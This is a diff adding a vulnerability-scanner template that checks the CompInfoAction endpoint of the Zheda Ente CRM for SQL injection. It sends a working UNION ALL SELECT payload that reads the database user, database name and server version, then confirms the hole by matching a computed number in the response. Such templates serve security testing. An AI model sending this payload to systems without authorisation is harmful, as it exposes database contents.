@@ -1,0 +1,32 @@
+id: poc-yaml-zhedaente-entsoft-compInfoaction
+info:
+  name: 浙大恩特客户资源管理系统 CompInfoAction SQL注入
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    SQL Injection vulnerability in 浙大恩特客户资源管理系统 CompInfoAction endpoint that can lead to sensitive information disclosure.
+
+variables:
+  t1: '{{rand_int(100,500)}}'
+  t2: '{{to_number(t1)*to_number(t1)*to_number(t1)}}'
+
+http:
+  - raw:
+      - |
+        GET /entsoft/CompInfoAction.emrser;.js?compnum=1'+UNION+ALL+SELECT+user,DB_NAME(),@@version,POWER({{t1}},3),NULL--+&method=selectCompBank HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"bankename\""
+          - "\"banknum\""
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
